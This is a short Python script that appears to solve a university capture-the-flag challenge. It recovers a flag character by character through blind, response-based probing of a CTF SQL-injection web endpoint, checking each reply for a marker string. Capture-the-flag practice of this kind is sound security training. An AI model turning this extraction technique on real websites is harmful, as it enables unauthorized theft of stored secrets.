import requests
from string import ascii_letters
URL = 'https://sqli.pwn.osucyber.club/newbeginnings.php'
PARAMS = {"q":"osuctf{"}

guessSet = ascii_letters + "}_-"

while PARAMS["q"].find("}") == -1:
    for c in guessSet:
        r = requests.get(url = URL, params = {"q":PARAMS["q"]+c})
        text = r.text
        if (text.find("Brutus Buckeye")!=-1):
            PARAMS["q"] += c
            print("Found Character: ", c)
            break
    print("Current PARAMS: ", PARAMS)

print(PARAMS)
